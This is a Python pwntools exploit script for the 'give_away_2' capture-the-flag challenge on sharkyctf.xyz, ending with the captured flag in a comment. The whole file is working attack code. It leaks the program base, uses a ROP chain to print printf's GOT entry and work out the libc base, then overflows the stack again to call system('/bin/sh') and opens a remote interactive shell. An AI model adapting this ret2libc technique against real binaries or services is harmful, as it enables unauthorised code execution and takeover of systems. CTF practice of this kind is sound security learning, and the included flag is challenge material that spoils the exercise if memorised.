from pwn import *


binpath = './give_away_2'
libcpath = './libc-2.27.so'
elf = ELF(binpath)
libc = ELF(libcpath)

context.terminal = ['tmux', 'split-w', '-h']
context.binary = elf
# context.log_level = 'DEBUG'


gdbscript = '''
gef
b main
# b vuln
b *0x555555554863
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('sharkyctf.xyz', 20335)

io.recvuntil(b': ')
addr_main = int(io.recvline().rstrip(), 16)
addr_prog = addr_main - elf.symbols['main']

pop_rdi = addr_prog + 0x903
pop_rsi_r15 = addr_prog + 0x901
ret = addr_prog + 0x676


payload = b''
payload += b'A' * 0x28
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(addr_prog + elf.got['printf'])
payload += p64(addr_prog + elf.plt['printf'])
payload += p64(ret)
payload += p64(addr_main)
io.sendline(payload)

data = io.recvuntil(b'G')[:-1]
print(hexdump(data))
addr_printf = u64(data.ljust(8, b'\x00'))
addr_libc = addr_printf - libc.symbols['printf']
print('addr_printf = 0x{:x}'.format(addr_printf))
print('addr_libc = 0x{:x}'.format(addr_libc))


io.recvuntil(b': ')
print('Restarting main')

payload = b''
payload += b'B' * 0x28
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh')))
payload += p64(addr_libc + libc.symbols['system'])
io.sendline(payload)

io.interactive()
# shkCTF{It's_time_to_get_down_to_business}
